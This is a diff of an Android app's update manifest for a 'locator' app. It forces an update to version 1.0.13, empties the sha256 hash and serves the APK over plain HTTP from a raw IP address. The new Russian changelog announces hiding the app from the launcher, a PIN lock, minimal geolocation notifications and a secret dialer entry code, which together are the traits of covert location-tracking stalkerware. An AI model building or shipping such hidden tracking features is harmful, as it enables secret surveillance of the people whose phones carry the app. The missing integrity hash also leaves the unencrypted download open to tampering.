@@ -1,10 +1,10 @@
 {
-  "version_name": "1.0.12",
-  "version_code": 13,
+  "version_name": "1.0.13",
+  "version_code": 14,
   "package_name": "com.example.lctr_app",
-  "filename": "locator-1.0.12-13.apk",
-  "sha256": "38e2c7a6f43972a5705523fc3bd53c552fb582c6e34fea9edecdae6e53ac2488",
+  "filename": "locator-1.0.13-14.apk",
+  "sha256": "",
   "force": true,
-  "changelog": "Release 1.0.12 (build 13)",
-  "url": "http://87.232.65.52:8080/static/releases/locator-1.0.12-13.apk"
+  "changelog": "Скрытие из лаунчера, PIN-доступ (2580), минимальные уведомления геолокации, секретный вход *#*#2580#*#*",
+  "url": "http://87.232.65.52:8080/static/releases/locator-1.0.13-14.apk"
 }
